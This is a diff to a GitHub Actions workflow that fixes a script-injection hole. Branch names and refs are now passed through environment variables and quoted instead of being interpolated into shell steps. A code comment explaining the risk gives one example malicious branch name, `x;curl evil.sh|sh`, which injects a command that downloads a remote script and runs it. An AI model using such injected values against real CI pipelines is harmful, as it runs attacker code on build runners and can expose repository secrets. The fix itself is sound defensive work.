@@ -12,17 +12,27 @@ jobs:
         with:
           ref: ${{github.base_ref}} # checkout the base branch (usually master/main).
 
+      # A branch name is attacker-controlled on a fork PR, so it goes through the
+      # environment rather than into the script text. Interpolating it directly
+      # lets a branch called `x;curl evil.sh|sh` run as this job — inert while the
+      # repository is private, live the moment anyone can open a fork PR.
       - name: Fetch the PR branch
+        env:
+          CLONE_URL: ${{ github.event.pull_request.head.repo.clone_url }}
+          HEAD_REF: ${{ github.head_ref }}
         run: |
-          git fetch ${{ github.event.pull_request.head.repo.clone_url }} ${{ github.head_ref }}:${{ github.head_ref }} --depth=1
+          git fetch "$CLONE_URL" "$HEAD_REF:$HEAD_REF" --depth=1
 
       - name: Get list of changed files relative to the main/master branch
         id: changed-files
+        env:
+          BASE_REF: ${{ github.base_ref }}
+          HEAD_REF: ${{ github.head_ref }}
         run: |
-          echo "all_changed_files=$(git diff --name-only ${{ github.base_ref }} ${{ github.head_ref }} | tr '\n' ' ')" >> $GITHUB_OUTPUT
+          echo "all_changed_files=$(git diff --name-only "$BASE_REF" "$HEAD_REF" | tr '\n' ' ')" >> "$GITHUB_OUTPUT"
 
-      - name: Use Node.js 22.x
-        uses: actions/setup-node@v4
+      - name: Use Node.js
+        uses: actions/setup-node@v7
         with:
           node-version: 22.x
 
@@ -41,7 +51,7 @@ jobs:
       # These files will not be deleted by the clean step in checkout
       # if the permissions are not reset.
       - name: Reset file permissions
-        run: sudo chown -R $USER:$USER .
+        run: sudo chown -R "$USER:$USER" .
 
       - name: Checkout the current branch
         uses: actions/checkout@v7
